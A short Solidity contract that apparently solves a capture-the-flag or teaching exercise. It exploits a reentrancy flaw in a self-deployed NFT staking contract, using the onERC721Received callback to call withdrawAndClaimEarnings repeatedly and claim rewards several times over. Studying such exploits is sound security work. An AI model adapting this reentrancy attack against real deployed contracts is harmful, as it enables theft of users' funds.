// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "../RewardToken.sol";

contract AttackContyract is IERC721Receiver {
    Depositoor public depositoor;
    NftToStake public nft;
    RewardToken public token;
    uint256 public attackCount;
    
    constructor() {
        nft = new NftToStake(address(this));
        depositoor = new Depositoor(nft);
        token = new RewardToken(address(depositoor));
        
        depositoor.setRewardToken(token);
    }
    
    function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
    ) external override returns (bytes4) {
        if (attackCount < 5) {  // Prevent infinite loop
            attackCount++;
            depositoor.withdrawAndClaimEarnings(42);
        }
        return IERC721Receiver.onERC721Received.selector;
    }
    
    function exploit() external {
         
        nft.approve(address(depositoor), 42);
        
         
        depositoor.withdrawAndClaimEarnings(42);
    }
}